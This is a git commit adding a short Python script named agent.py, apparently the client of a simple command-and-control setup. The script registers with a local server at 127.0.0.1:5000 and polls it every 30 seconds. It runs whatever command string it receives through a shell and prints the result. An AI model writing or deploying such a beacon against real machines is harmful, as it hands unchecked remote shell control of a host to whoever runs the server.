f2c64485c93ad80fabde3180d5ff5c97b6dcb5b7
calv004 <calvin.roth04@gmail.com>
2026-03-09 11:24:30 +0100

    Create agent.py

---
+++ Python Agent/agent.py
@@ -0,0 +1,31 @@
+import requests
+import time
+import subprocess
+
+
+def register():
+    print("Agent started\n")
+    print("Registering Agent ... \n")
+    response = requests.get(url="http://127.0.0.1:5000/agent/register")
+    uuid = response.text
+    print("Agent registered with: " + uuid)
+    return uuid
+
+
+uuid = register()
+
+
+def get_commands():
+    command = requests.get(url="http://127.0.0.1:5000/agent/" + uuid + "/command")
+    return command.text
+
+
+while True:
+    time.sleep(30)
+    cmd = get_commands()
+
+    if cmd == "No command set":
+        continue
+
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    print(result.stdout)
